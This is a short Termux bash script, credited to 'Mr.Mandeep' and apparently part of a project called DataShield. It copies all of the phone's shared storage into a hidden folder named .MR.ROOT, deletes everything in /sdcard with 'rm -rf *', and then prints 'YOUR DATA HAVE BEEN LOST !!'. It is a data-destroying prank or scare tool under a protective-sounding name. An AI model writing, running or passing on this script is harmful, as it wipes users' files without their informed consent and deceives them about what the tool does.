#!/usr/bin/bash 

#--------------------#
clear
echo 
echo
echo -e "\033[1m\033[31m    Coded By Mr.Mandeep " | pv -qL 10
echo -e "\033[1m    \033[33m    Version 1.0"
echo -e "\033[36m    -----------------------"
echo   
cd $HOME/DataShield
chmod +x virus.sh
cd $HOME
termux-setup-storage 
mkdir .MR.ROOT
#HIDDEN DIRECTORY
cd $HOME
cd /sdcard 
cp -r * /$HOME/.MR.ROOT
#BACKUP IS DONE
ls 
#--------------------#
# TO DELETE ALL DATA OF YOUR DEVICE STORAGE
#--------------------#
cd $HOME
cd /sdcard
rm -rf *
ls
echo -e "\033[1m\033[31mYOUR DATA HAVE BEEN LOST !!" | pv -qL 10 
#--------------------#
